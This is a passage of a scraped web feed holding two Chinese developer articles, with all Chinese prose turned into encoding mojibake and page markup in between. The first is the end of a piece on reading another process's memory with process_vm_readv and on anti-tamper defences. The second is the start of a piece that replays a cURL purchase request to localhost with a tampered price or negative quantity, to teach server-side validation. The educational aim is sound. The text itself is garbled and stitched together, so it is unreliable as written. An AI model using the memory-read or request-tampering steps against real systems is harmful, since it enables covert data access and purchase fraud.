<p>Linux 3.2 ä¹‹åå¼•å…¥çš„ <code>process_vm_readv/writev</code> æ˜¯å®˜æ–¹æ¨èçš„è·¨è¿›ç¨‹å†…å­˜è®¿é—®æ–¹æ¡ˆã€‚å®ƒç»“åˆäº†å‰ä¸¤ç§æ–¹æ³•çš„ä¼˜ç‚¹ï¼š<strong>æ•ˆç‡é«˜ã€æ— éœ€æš‚åœç›®æ ‡è¿›ç¨‹</strong>ã€‚</p>
<h3 data-id="heading-5">æç®€å®ç°</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">iovec</span> local = {buf, size};    <span class="hljs-comment">// æœ¬åœ°ç¼“å†²åŒº</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">iovec</span> remote = {(<span class="hljs-type">void</span>*)addr, size};  <span class="hljs-comment">// ç›®æ ‡è¿›ç¨‹åœ°å€</span>

<span class="hljs-comment">// ä¸€è¡Œä»£ç å®Œæˆè¯»å–ï¼Œç›®æ ‡è¿›ç¨‹æ— æ„ŸçŸ¥</span>
<span class="hljs-type">ssize_t</span> n = <span class="hljs-built_in">process_vm_readv</span>(pid, &amp;local, <span class="hljs-number">1</span>, &amp;remote, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
</code></pre>
<p>è¿™æ‰æ˜¯ç°ä»£ Linux ç³»ç»Ÿåº”è¯¥ç”¨çš„æ–¹æ¡ˆã€‚å®ƒé€šè¿‡å†…æ ¸ç›´æ¥æ‹·è´æ•°æ®ï¼Œé¿å…äº†é¢‘ç¹çš„è¿›ç¨‹çŠ¶æ€åˆ‡æ¢ã€‚<strong>æœ€çˆ½çš„æ˜¯ï¼Œç›®æ ‡è¿›ç¨‹ä¸éœ€è¦ STOP</strong>ï¼Œä½ å¯ä»¥åœ¨äººå®¶æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¯»æ•°æ®ã€‚è¿™åœ¨æŸäº›ç›‘æ§åœºæ™¯ä¸‹ç®€ç›´æ˜¯ç¥å™¨ã€‚</p>
<p>ä½†åˆ«é«˜å…´å¤ªæ—©ï¼Œè¿™ä¸ª API ä¹Ÿæœ‰è½¯è‚‹ï¼š<strong>æƒé™æ£€æŸ¥æå…¶ä¸¥æ ¼</strong>ã€‚ä½ åªèƒ½è®¿é—®æœ‰æƒé™çš„å†…å­˜åŒºåŸŸï¼Œè€Œä¸” SELinux ç­–ç•¥å¯èƒ½ä¼šç›´æ¥æ‹¦æˆªè¿™ä¸ªè°ƒç”¨ã€‚å®æˆ˜ä¸­ï¼Œå¾ˆå¤š"çœ‹ä¼¼å¯è¡Œ"çš„æ–¹æ¡ˆåˆ°äº†ç”Ÿäº§ç¯å¢ƒå°±å“‘ç«ï¼Œå°±æ˜¯å› ä¸ºå®‰å…¨ç­–ç•¥é™åˆ¶ã€‚</p>
<h2 data-id="heading-6">æ”»é˜²å¯¹æŠ—ï¼šé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆ</h2>
<p>æå®‰å…¨ä¸èƒ½åªçœ‹æ”»å‡»é¢ï¼Œé˜²æŠ¤æ–¹æ¡ˆæ‰æ˜¯çœŸé‡‘ç™½é“¶ã€‚è¿™ä¸‰ç§æŠ€æœ¯éƒ½è¢«æ¶æ„è½¯ä»¶ç”¨çƒ‚äº†ï¼Œä»æœ¨é©¬ç›—å·åˆ°å¤–æŒ‚ä¿®æ”¹æ¸¸æˆæ•°æ®ï¼ŒåŸç†éƒ½ä¸€æ ·ï¼š<strong>æ”»å‡»è€…å¿…é¡»å…ˆæ‰¾åˆ°æœ‰ä»·å€¼çš„å†…å­˜åœ°å€</strong>ã€‚</p>
<h3 data-id="heading-7">æ”»å‡»è€…çš„æƒ¯ç”¨å¥—è·¯</h3>
<ol>
<li><strong>é™æ€åˆ†æ</strong>ï¼šåç¼–è¯‘ä½ çš„ç¨‹åºï¼Œæ‰¾å…³é”®å‡½æ•°å’Œå…¨å±€å˜é‡</li>
<li><strong>åŠ¨æ€è°ƒè¯•</strong>ï¼šç”¨ ptrace æˆ– gdb è·Ÿè¸ªå†…å­˜è®¿é—®</li>
<li><strong>ç‰¹å¾æ‰«æ</strong>ï¼šæœç´¢å†…å­˜ä¸­çš„ç‰¹å®šå­—ç¬¦ä¸²æˆ–æ•°æ®ç»“æ„</li>
</ol>
<h3 data-id="heading-8">é˜²æŠ¤æ€è·¯ï¼šè®©æ”»å‡»è€…æ‰¾ä¸åˆ°åŒ—</h3>
<p>ä¹‹å‰å¸®ä¸€ä¸ªé‡‘èå®¢æˆ·åšåŠ å›ºï¼Œè¯•è¿‡å‡ ç§å¼€æºæ–¹æ¡ˆæ•ˆæœéƒ½ä¸å¤ªç†æƒ³ï¼Œæœ€åç”¨äº† <strong>Virbox Protector</strong>ï¼Œä¸»è¦æ˜¯çœ‹ä¸­äº†å®ƒçš„å‡ ä¸ªå®æˆ˜ç‰¹æ€§ï¼š</p>
<p><strong>ä»£ç è™šæ‹ŸåŒ–</strong>ï¼šæŠŠæ ¸å¿ƒå‡½æ•°ç¿»è¯‘æˆè‡ªå®šä¹‰æŒ‡ä»¤é›†ï¼Œåœ¨è™šæ‹Ÿæœºé‡Œæ‰§è¡Œã€‚æ”»å‡»è€…é™æ€åˆ†æçœ‹åˆ°çš„æ˜¯å¤©ä¹¦ï¼ŒåŠ¨æ€è°ƒè¯•ä¹Ÿæ‰¾ä¸åˆ°æ ‡å‡†æŒ‡ä»¤ï¼Œæåº¦é…¸çˆ½ã€‚æˆ‘ä»¬æœ‰ä¸ªæ”¯ä»˜æ ¡éªŒå‡½æ•°ï¼Œè™šæ‹ŸåŒ–åIDA proæ ¹æœ¬è¯†åˆ«ä¸å‡ºé€»è¾‘ã€‚</p>
<p><strong>æ§åˆ¶æµæ··æ·†</strong>ï¼šé€šè¿‡å¹³å¦åŒ–+è™šå‡åˆ†æ”¯ï¼ŒæŠŠæ¸…æ™°çš„ if-else å˜æˆè¿·å®«ã€‚ä½ ä»¥ä¸ºåœ¨è°ƒ <code>check_license()</code>ï¼Ÿå…¶å®æ˜¯åœ¨èµ°è¿·å®«ï¼ŒçœŸæ­£çš„æ ¡éªŒè—åœ¨ç¬¬å…«å±‚ã€‚é…åˆ<strong>å¯¼å…¥è¡¨ä¿æŠ¤</strong>ï¼ŒæŠŠæ•æ„Ÿ API è°ƒç”¨éšè—èµ·æ¥ï¼Œè‡ªåŠ¨åŒ–åˆ†æå·¥å…·ç›´æ¥æŠ“çã€‚</p>
<p><strong>å†…å­˜åŠ å¯†+æ ¡éªŒ</strong>ï¼šå¯†é’¥ã€æ•æ„Ÿæ•°æ®åœ¨å†…å­˜ä¸­æ˜¯åŠ å¯†çš„ï¼Œç”¨æ—¶æ‰è§£å¯†ã€‚å³ä½¿æ”»å‡»è€…ç”¨ process_vm_readv  dump å†…å­˜ï¼Œæ‹¿åˆ°çš„ä¹Ÿæ˜¯ä¹±ç ã€‚è¿è¡Œæ—¶è¿˜ä¼šåšå†…å­˜å®Œæ•´æ€§æ ¡éªŒï¼Œå‘ç°è¢« patch ç›´æ¥è§¦å‘ç†”æ–­æœºåˆ¶ã€‚</p>
<p><strong>åè°ƒè¯•æ£€æµ‹</strong>ï¼šæ£€æµ‹ ptrace é™„åŠ è¡Œä¸ºï¼Œå‘ç°è°ƒè¯•å™¨ç›´æ¥é€€å‡ºæˆ–èµ°è™šå‡åˆ†æ”¯ã€‚è¿™æ‹›å¯¹ä»˜è„šæœ¬å°å­ç«‹ç«¿è§å½±ã€‚</p>
<h2 data-id="heading-9">æœ€åçš„è¯</h2>
<p>æŠ€æœ¯æœ¬èº«ä¸­æ€§ï¼Œptrace å¯ä»¥è°ƒè¯•ç”¨ï¼Œä¹Ÿå¯ä»¥å†™æœ¨é©¬ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œç†è§£è¿™äº›æœºåˆ¶ä¸æ˜¯ä¸ºäº†æç ´åï¼Œè€Œæ˜¯çŸ¥é“æ•Œäººä»å“ªæ¥ï¼Œæ‰èƒ½ç­‘èµ·çœŸæ­£çš„é˜²çº¿ã€‚</p>
<p>åˆ«æŒ‡æœ›å•ä¸€æ–¹æ¡ˆèƒ½åŒ…æ‰“å¤©ä¸‹ã€‚æˆ‘è§è¿‡å¤ªå¤šé¡¹ç›®åªç”¨ä»£ç æ··æ·†ï¼Œç»“æœä¸€è¿è¡Œå°±è¢« dump å†…å­˜ï¼›ä¹Ÿè§è¿‡è¿‡åº¦åŠ å¯†å¯¼è‡´æ€§èƒ½å´©ç›˜ã€‚<strong>å®‰å…¨æ˜¯ç³»ç»Ÿå·¥ç¨‹ï¼Œéœ€è¦é™æ€ä¿æŠ¤+åŠ¨æ€æ£€æµ‹+è¿è¡Œæ—¶æ ¡éªŒçš„å¤šå±‚é˜²å¾¡</strong>ã€‚</p>
<p>ä½ çš„ç¨‹åºåœ¨æ”»å‡»è€…çœ¼é‡Œæ˜¯ä»€ä¹ˆéš¾åº¦ï¼Ÿæ˜¯ä¸€ç›®äº†ç„¶çš„è¯´æ˜ä¹¦ï¼Œè¿˜æ˜¯éœ€è¦èŠ±å‡ å‘¨æ—¶é—´æ‰èƒ½æ‘¸å‡ºé—¨é“çš„é»‘ç›’å­ï¼Ÿç­”æ¡ˆå–å†³äºä½ ä»Šå¤©çš„é€‰æ‹©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼]]></title>    <link>https://juejin.cn/post/7580616979473367046</link>    <guid>https://juejin.cn/post/7580616979473367046</guid>    <pubDate>2025-12-08T03:21:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473367046" data-draft-id="7580616979472826374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,å®‰å…¨"/> <meta itemprop="datePublished" content="2025-12-08T03:21:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:21:34.000Z" title="Mon Dec 08 2025 03:21:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53bee3648e0b41659653bc2953e1f444~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=B5RhdxFQS2UKtrgA9jDsyyRTUeM%3D" alt="image.png" loading="lazy"/></p>
<p>å¤§å®¶å¥½ğŸ˜ã€‚</p>
<p>ä¸Šä¸ªæœˆ Code Reviewï¼Œæˆ‘æ‹¦ä¸‹äº†ä¸€ä¸ªæ–°äººçš„ä»£ç ã€‚</p>
<p>ä»–å†™äº†ä¸€ä¸ªè½¬è´¦åŠŸèƒ½ï¼Œå‰ç«¯åšäº†æå…¶ä¸¥å¯†çš„æ ¡éªŒï¼š</p>
<ul>
<li>é‡‘é¢å¿…é¡»æ˜¯æ•°å­—ã€‚</li>
<li>é‡‘é¢å¿…é¡»å¤§äº 0ã€‚</li>
<li>ä½™é¢ä¸è¶³æ—¶ï¼Œæäº¤æŒ‰é’®æ˜¯ <code>disabled</code> çš„ã€‚</li>
<li>ç”šè‡³è¿˜å†™äº†å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œé˜²æ­¢è¾“å…¥è´Ÿå·ã€‚</li>
</ul>
<p>ä»–è‡ªä¿¡æ»¡æ»¡åœ°è·Ÿæˆ‘è¯´ï¼šè€å¤§ï¼Œæ”¾å¿ƒå§ï¼Œæˆ‘å‰ç«¯å¡å¾—æ­»æ­»çš„ï¼Œç”¨æˆ·ç»å¯¹ä¼ ä¸äº†éæ³•æ•°æ®ã€‚</p>
<p>æˆ‘ç¬‘äº†ç¬‘ğŸ¤£ï¼Œæ²¡çœ‹ä»–çš„åç«¯ä»£ç ï¼Œç›´æ¥æ‰“å¼€ç»ˆç«¯ï¼Œæ•²äº†ä¸€è¡Œå‘½ä»¤ã€‚</p>
<p>0.5 ç§’åï¼Œä»–çš„æ•°æ®åº“é‡Œå¤šäº†ä¸€ç¬”â€œ-10000â€çš„è½¬è´¦è®°å½•ï¼Œä½™é¢ç¬é—´æš´æ¶¨ï¼</p>
<p>ä»–çœ‹ç€å±å¹•ï¼Œç›®çªå£å‘†ï¼šè¿™â€¦â€¦ä½ æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿæˆ‘æŒ‰é’®æ˜æ˜ç½®ç°äº†å•Šï¼</p>
<p>ä»Šå¤©ï¼Œæˆ‘å°±æ¥æ­ç§˜è¿™ä¸ªæ‰€æœ‰åç«¯ï¼ˆå’Œå…¨æ ˆï¼‰å·¥ç¨‹å¸ˆå¿…é¡»é“­è®°çš„ç¬¬ä¸€é“å¾‹ï¼š</p>
<p><strong>å‰ç«¯éªŒè¯ï¼Œåœ¨é»‘å®¢çœ¼é‡Œï¼Œåªæ˜¯ä¸ªå°caseğŸ¤”ã€‚</strong></p>
<hr/>
<h4 data-id="heading-0"><strong>æˆ‘æ˜¯å¦‚ä½•ç¾è¾±å‰ç«¯éªŒè¯çš„</strong></h4>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè´­ç‰©ç½‘ç«™ï¼Œå‰ç«¯æœ‰ä¸€ä¸ªç®€å•çš„è´­ä¹°è¡¨å•ã€‚</p>
<p><strong>å‰ç«¯é€»è¾‘ï¼ˆçœ‹ä¼¼å®Œç¾ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// Front-end code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">submitOrder</span>(<span class="hljs-params">price, quantity</span>) {
  <span class="hljs-comment">// 1. æ ¡éªŒä»·æ ¼ä¸èƒ½è¢«ç¯¡æ”¹</span>
  <span class="hljs-keyword">if</span> (price !== <span class="hljs-number">999</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">"ä»·æ ¼å¼‚å¸¸ï¼"</span>);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// 2. æ ¡éªŒæ•°é‡å¿…é¡»ä¸ºæ­£æ•°</span>
  <span class="hljs-keyword">if</span> (quantity &lt;= <span class="hljs-number">0</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">"æ•°é‡å¿…é¡»å¤§äº0ï¼"</span>);
    <span class="hljs-keyword">return</span>;
  }
  
  <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
  api.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/buy'</span>, { price, quantity });
}
</code></pre>
<p>ä½ çœ‹ï¼Œç”¨æˆ·åœ¨æµè§ˆå™¨é‡Œç¡®å®æ²¡æ³•ä½œæ¶ã€‚ä»–æ”¹ä¸äº†ä»·æ ¼ï¼Œä¹Ÿå¡«ä¸äº†è´Ÿæ•°ã€‚</p>
<p><strong>ä½†æ˜¯é»‘å®¢ï¼Œä»æ¥ä¸ç”¨æµè§ˆå™¨ç‚¹ä½ çš„æŒ‰é’®ã€‚</strong></p>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼šæ‰“å¼€DevTools Network é¢æ¿ï¼Œæ­£å¸¸ç‚¹ä¸€æ¬¡è´­ä¹°æŒ‰é’®ã€‚æ•è·åˆ°äº†è¿™ä¸ªè¯·æ±‚ã€‚</p>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼šè¯·æ±‚ä¸Šå³é”® -&gt; å¤åˆ¶ -&gt; cURL æ ¼å¼å¤åˆ¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6860d99da82a4c44a6a86c4c9c564c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=1RzhWTIf3FLgar0L1KcMs2g9HO8%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¸€æ­¥ï¼Œæˆ‘å·²ç»æ‹¿åˆ°äº†ä½ å‘é€è¯·æ±‚çš„æ‰€æœ‰å¯†é’¥ï¼šURLã€Headersã€Cookiesã€ä»¥åŠé‚£ä¸ªçœ‹ä¼¼åˆæ³•çš„ Dataã€‚</p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼šæ‰“å¼€ç»ˆç«¯ï¼ˆTerminalï¼‰ï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œæˆ‘å¹¶æ²¡æœ‰ç›´æ¥å›è½¦ã€‚</p>
<p>æˆ‘ä¿®æ”¹äº† <code>--data-raw</code> é‡Œçš„å‚æ•°ï¼š</p>
<ul>
<li>æŠŠ <code>"price": 999</code> æ”¹æˆäº† <code>"price": 0.01</code></li>
<li>æˆ–è€…æŠŠ <code>"quantity": 1</code> æ”¹æˆäº† <code>"quantity": -100</code></li>
</ul>
<pre><code class="hljs language-Bash" lang="Bash"><span class="hljs-comment"># ç»è¿‡é­”æ”¹åçš„å‘½ä»¤</span>
curl <span class="hljs-string">'http://localhost:3000/user/buy'</span> \
  -H <span class="hljs-string">'Cookie: session_id=...'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  --data-raw <span class="hljs-string">'{"price": 0.01, "quantity": 10}'</span> \
  --compressed
</code></pre>
<p><strong>å›è½¦ï¼</strong></p>
<p>æœåŠ¡å™¨è¿”å›ï¼š<code>{ "status": "success", "msg": okï¼" }</code></p>
<p><strong>æ­å–œä½ ï¼Œä½ çš„å‰ç«¯éªŒè¯æ¯«å‘æ— æŸï¼Œä½†ä½ çš„æ•°æ®åº“å·²ç»è¢«æˆ‘å‡»ç©¿äº†ã€‚</strong> æˆ‘ç”¨ 1 åˆ†é’±ä¹°äº† 10 ä¸ªå•†å“ï¼Œæˆ–è€…é€šè¿‡è´Ÿæ•°æ•°é‡ï¼Œåå‘åˆ·äº†åº“å­˜ã€‚</p>
<hr/>
<h4 data-id="heading-1"><strong>ä¸ºä»€ä¹ˆå‰ç«¯éªŒè¯, é˜²ä¸äº†å°äººğŸ¤”</strong></h4>
<p>å¾ˆå¤šæ–°äººæœ€å¤§çš„è¯¯åŒºï¼Œå°±æ˜¯è®¤ä¸º<strong>ç”¨æˆ·åªèƒ½é€šè¿‡æˆ‘çš„ UI æ¥è®¿é—®æˆ‘çš„æœåŠ¡å™¨ã€‚</strong></p>
<p>é”™ï¼å¤§é”™ç‰¹é”™ï¼</p>
<p>Web çš„æœ¬è´¨æ˜¯ HTTP åè®®ã€‚</p>
<p>HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ã€å…¬å¼€çš„ã€‚ä»»ä½•èƒ½å¤Ÿå‘é€ HTTP è¯·æ±‚çš„å®¢æˆ·ç«¯ï¼Œéƒ½æ˜¯ä½ çš„ç”¨æˆ·ã€‚</p>
<ul>
<li>Chrome æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li><code>cURL</code> æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>Postman æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>Python çš„ <code>requests</code> è„šæœ¬ä¹Ÿæ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>node çš„ <code>http</code> è„šæœ¬ä¹Ÿæ˜¯å®¢æˆ·ç«¯</li>
</ul>
<p>å‰ç«¯ä»£ç è¿è¡Œåœ¨ç”¨æˆ·çš„ç”µè„‘ä¸Šã€‚</p>
<p>è¿™æ„å‘³ç€ï¼Œç”¨æˆ·æ‹¥æœ‰å¯¹å‰ç«¯ä»£ç çš„<strong>ç»å¯¹æ§åˆ¶æƒ</strong>ã€‚</p>
<ul>
<li>ä»–å¯ä»¥ç¦ç”¨ JSã€‚</li>
<li>ä»–å¯ä»¥åœ¨ Console é‡Œé‡å†™ä½ çš„æ ¡éªŒå‡½æ•°ã€‚</li>
<li>ä»–å¯ä»¥æ‹¦æˆªè¯·æ±‚ï¼ˆç”¨ Charles/Fiddlerï¼‰å¹¶ä¿®æ”¹æ•°æ®ã€‚</li>
<li>ä»–ç”šè‡³å¯ä»¥å®Œå…¨æŠ›å¼ƒæµè§ˆå™¨ï¼Œç›´æ¥ç”¨è„šæœ¬è½°ç‚¸ä½ çš„ APIã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼Œ<strong>å‰ç«¯éªŒè¯çš„å”¯ä¸€ä½œç”¨ï¼Œæ˜¯æå‡ç”¨æˆ·ä½“éªŒ</strong> ï¼ˆæ¯”å¦‚æç¤ºç”¨æˆ·æ ¼å¼ä¸å¯¹ğŸ˜‚ï¼‰ï¼Œè€Œä¸æ˜¯æä¾›å®‰å…¨æ€§ğŸ˜–ã€‚</p>
<hr/>
<h4 data-id="heading-2"><strong>åç«¯è¯¥å¦‚ä½•é˜²å¾¡ï¼Ÿï¼ˆä¸è¦è£¸å¥”ï¼‰</strong></h4>
<p>æ—¢ç„¶å‰ç«¯ä¸å¯ä¿¡ï¼Œåç«¯ï¼ˆæˆ– BFF å±‚ï¼‰å°±å¿…é¡»å‡è®¾<strong>æ‰€æœ‰å‘è¿‡æ¥çš„æ•°æ®éƒ½æ˜¯æœ‰æ¯’çš„</strong>ã€‚</p>
<p><strong>1. æ°¸è¿œä¸è¦ç›¸ä¿¡ Payload é‡Œçš„å…³é”®æ•°æ®</strong></p>
<p>å‰ç«¯åªä¼  <code>productId</code>ã€‚åç«¯æ‹¿åˆ° ID åï¼Œ<strong>å»æ•°æ®åº“é‡ŒæŸ¥</strong>è¿™ä¸ªå•†å“åˆ°åº•å¤šå°‘é’±ã€‚æ°¸è¿œä»¥æ•°æ®åº“ä¸ºå‡†ã€‚</p>
<p><strong>2. ä½¿ç”¨ Schema æ ¡éªŒåº“ï¼ˆZod / Joi / class-validatorï¼‰</strong></p>
<p>ä¸è¦åœ¨ Controller é‡Œå†™ä¸€å † if (req.body.age &lt; 0)ã€‚</p>
<p>ä½¿ç”¨ä¸“ä¸šçš„ Schema æ ¡éªŒåº“ï¼Œå®šä¹‰å¥½æ•°æ®çš„è§„åˆ™ã€‚</p>
<p>TypeScriptä»£ç ğŸ‘‡ï¼š</p>
